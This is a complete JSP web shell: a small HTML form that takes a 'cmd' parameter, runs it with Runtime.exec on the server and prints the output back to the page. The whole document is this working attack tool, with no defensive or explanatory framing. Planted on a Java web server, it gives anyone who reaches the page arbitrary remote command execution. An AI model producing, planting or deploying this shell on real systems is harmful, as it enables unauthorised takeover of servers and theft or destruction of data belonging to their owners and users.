<%@ page import="java.io.*" %>
  <html>
    <body>
      <form method="GET">
        <input type="text" name="cmd">
        <input type="submit" value="SEND COMMAND">
      </form>
      <pre>

  <%
    if (request.getParameter("cmd") != null) 
    { 
        try 
        {
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            InputStreamReader isr = new InputStreamReader(p.getInputStream());
            BufferedReader reader = new BufferedReader(isr);
            String linea;

            while ((linea = reader.readLine()) != null) {
              out.println(linea + "<br>");
            }

        } catch (Exception e) {
          out.println("Error sending command: " + e.getMessage());
        }
    }

  %>
        </pre>
      </body>
    </html>

